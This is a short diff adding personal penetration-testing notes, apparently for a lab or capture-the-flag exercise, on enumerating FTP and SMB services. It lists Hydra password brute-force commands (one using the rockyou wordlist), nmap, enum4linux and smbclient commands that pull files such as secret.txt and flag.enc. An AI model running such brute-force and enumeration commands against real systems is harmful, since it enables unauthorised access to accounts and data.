@@ -1,2 +1,17 @@
 Enumeration:
 FTP enumeration:
+Hydra -l username –p password ftp://IP ….we use small l if we know the user and we use capital L if we don’t know the user-
+->ftp 10.10.10.10
+ftp>get secret.txt
+
+SMB Emumeration
+Tips:- nmap -p 445,139 --open -sV subnet
+:-enum4linux -a Ip
+:- hydra -l student -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10
+:-smbclient \\\\ip\\share -U student(widnows style will not work for linux)
+:- smbclient //ip/share -U student
+smb: \> ls
+  flag.enc
+smb: \> get flag.enc
+smb: \> exit
+:- file flag.enc( to identify encryption type)
